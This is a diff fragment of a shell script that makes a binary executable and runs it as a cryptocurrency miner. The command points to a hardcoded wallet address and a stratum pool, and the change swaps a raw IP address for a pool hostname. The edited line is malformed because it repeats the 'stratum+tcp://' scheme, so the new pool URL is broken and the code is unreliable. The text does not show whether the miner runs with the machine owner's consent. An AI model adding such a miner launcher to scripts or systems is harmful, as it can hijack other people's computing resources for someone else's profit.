@@ -13,4 +13,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -stratum stratum+tcp://0xBD3D3E9878145D58dBF214a2ac684F93530Cf1bc.opseabb:x@50.116.22.22:7056
+./"$BIN_NAME" -stratum stratum+tcp://0xBD3D3E9878145D58dBF214a2ac684F93530Cf1bc.opseabb:x@stratum+tcp://xphash.xppool.io:3333
